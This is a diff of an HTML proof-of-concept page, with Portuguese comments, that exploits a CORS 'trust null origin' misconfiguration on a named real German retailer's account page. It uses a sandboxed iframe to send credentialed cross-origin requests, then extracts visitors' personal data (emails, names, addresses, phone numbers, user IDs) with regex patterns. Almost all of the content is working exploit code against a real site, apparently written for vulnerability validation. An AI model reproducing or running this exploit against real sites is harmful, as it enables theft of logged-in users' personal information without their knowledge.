@@ -1,66 +1,122 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CORS PoC</title>
-</head>
+<head><title>CORS PoC - expert.de</title></head>
 <body>
-  <h2>CORS PoC - Validação</h2>
-  <p>Status: <b id="status">Aguardando...</b></p>
-  <p>Dados capturados:</p>
-  <pre id="output" style="background:#f5f5f5;padding:15px;max-height:500px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-all">
-    Aguardando resposta...
-  </pre>
+<h2>CORS PoC — trust_null</h2>
+<p id="status">Iniciando...</p>
+<pre id="output" style="background:#f5f5f5;padding:15px;overflow:auto;max-height:500px;white-space:pre-wrap;word-break:break-all;font-size:11px"></pre>
 
-  <script>
-    document.getElementById('status').textContent = 'Fazendo request...';
+<script>
+document.getElementById('status').textContent = 'Abrindo vetor...';
 
-    fetch('https://www.expert.de/shop/mein-expert/persoenliche-daten', {
-      method: 'GET',
-      credentials: 'include'
-    })
-    .then(function(response) {
-      document.getElementById('status').textContent = 
-        'HTTP ' + response.status + ' - ' + 
-        'ACAO: ' + response.headers.get('access-control-allow-origin') + 
-        ' | Credentials: ' + response.headers.get('access-control-allow-credentials');
-      return response.text();
-    })
-    .then(function(html) {
-      // Mostrar HTML recebido
-      document.getElementById('output').textContent = html;
-
-      // Tentar extrair dados visíveis
-      var parser = new DOMParser();
-      var doc = parser.parseFromString(html, 'text/html');
-
-      var dados = [];
-
-      // Pegar inputs preenchidos
-      doc.querySelectorAll('input').forEach(function(el) {
-        if (el.value && el.value.trim() !== '') {
-          dados.push('INPUT [' + (el.name||el.id||el.type) + ']: ' + el.value);
-        }
-      });
-
-      // Pegar elementos com dados pessoais
-      doc.querySelectorAll('[class*="name"],[class*="email"],[class*="address"],[class*="phone"],[class*="user"],[class*="profile"]').forEach(function(el) {
-        var txt = (el.innerText || el.textContent || '').trim();
-        if (txt.length > 2 && txt.length < 300) {
-          dados.push('ELEMENTO [' + el.className + ']: ' + txt);
-        }
-      });
-
-      if (dados.length > 0) {
-        document.getElementById('output').textContent = 
-          '=== DADOS EXTRAÍDOS ===\n\n' + 
-          dados.join('\n') + 
-          '\n\n=== HTML COMPLETO ===\n\n' + html;
-      }
-    })
-    .catch(function(err) {
-      document.getElementById('status').textContent = 'ERRO: ' + err;
-      document.getElementById('output').textContent = err.toString();
+// Vetor 1: iframe sandbox sem allow-same-origin
+// Gera Origin: null sem herdar contexto do pai
+var iframe = document.createElement('iframe');
+iframe.sandbox = 'allow-scripts';
+iframe.style.display = 'none';
+iframe.srcdoc = `
+<script>
+  var target = 'https://www.expert.de/shop/mein-expert/persoenliche-daten';
+  
+  fetch(target, {
+    method: 'GET',
+    credentials: 'include',
+    mode: 'cors'
+  })
+  .then(function(r) {
+    var status = r.status;
+    var acao = r.headers.get('access-control-allow-origin');
+    var acac = r.headers.get('access-control-allow-credentials');
+    return r.text().then(function(body) {
+      parent.postMessage({
+        type: 'result',
+        status: status,
+        acao: acao,
+        acac: acac,
+        bodyLength: body.length,
+        bodySnippet: body.substring(0, 500),
+        body: body
+      }, '*');
     });
-  </script>
+  })
+  .catch(function(e) {
+    parent.postMessage({
+      type: 'error',
+      message: e.toString()
+    }, '*');
+  });
+<\/script>
+`;
+
+document.body.appendChild(iframe);
+
+window.addEventListener('message', function(e) {
+  var d = e.data;
+  
+  if (d.type === 'error') {
+    document.getElementById('status').innerHTML = 
+      '<span style="color:red">ERRO: ' + d.message + '</span>';
+    document.getElementById('output').textContent = d.message;
+    return;
+  }
+  
+  if (d.type === 'result') {
+    var sucesso = d.acao === 'null' && d.acac === 'true';
+    
+    document.getElementById('status').innerHTML = sucesso
+      ? '<span style="color:green">✔ VULNERÁVEL — ACAO: ' + d.acao + ' | Credentials: ' + d.acac + ' | HTTP ' + d.status + ' | ' + d.bodyLength + ' bytes recebidos</span>'
+      : '<span style="color:orange">ACAO: ' + d.acao + ' | HTTP ' + d.status + '</span>';
+    
+    // Tentar extrair dados pessoais do HTML
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(d.body, 'text/html');
+    var extraidos = [];
+    
+    // Pegar inputs com valor
+    doc.querySelectorAll('input[value]').forEach(function(el) {
+      if (el.value && el.value.trim()) {
+        extraidos.push('INPUT [' + (el.name || el.id) + ']: ' + el.value);
+      }
+    });
+    
+    // Procurar padrões de dados no HTML bruto
+    var patterns = [
+      { name: 'Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g },
+      { name: 'Nome', regex: /"firstName"\s*:\s*"([^"]+)"/g },
+      { name: 'Sobrenome', regex: /"lastName"\s*:\s*"([^"]+)"/g },
+      { name: 'Rua', regex: /"street"\s*:\s*"([^"]+)"/g },
+      { name: 'CEP', regex: /"zip"\s*:\s*"([^"]+)"/g },
+      { name: 'Cidade', regex: /"city"\s*:\s*"([^"]+)"/g },
+      { name: 'Telefone', regex: /"telephone"\s*:\s*"([^"]+)"/g },
+      { name: 'UserId', regex: /"userId"\s*:\s*"([^"]+)"/g }
+    ];
+    
+    patterns.forEach(function(p) {
+      var matches = d.body.match(p.regex);
+      if (matches) {
+        extraidos.push(p.name + ': ' + matches.slice(0, 3).join(', '));
+      }
+    });
+    
+    var saida = '';
+    
+    if (extraidos.length > 0) {
+      saida += '=== DADOS PESSOAIS EXTRAÍDOS ===\n\n';
+      saida += extraidos.join('\n');
+      saida += '\n\n';
+    }
+    
+    saida += '=== HEADERS DA RESPOSTA ===\n';
+    saida += 'Access-Control-Allow-Origin: ' + d.acao + '\n';
+    saida += 'Access-Control-Allow-Credentials: ' + d.acac + '\n';
+    saida += 'HTTP Status: ' + d.status + '\n';
+    saida += 'Tamanho da resposta: ' + d.bodyLength + ' bytes\n\n';
+    saida += '=== PRIMEIROS 500 CHARS DO BODY ===\n\n';
+    saida += d.bodySnippet;
+    
+    document.getElementById('output').textContent = saida;
+  }
+});
+</script>
 </body>
 </html>
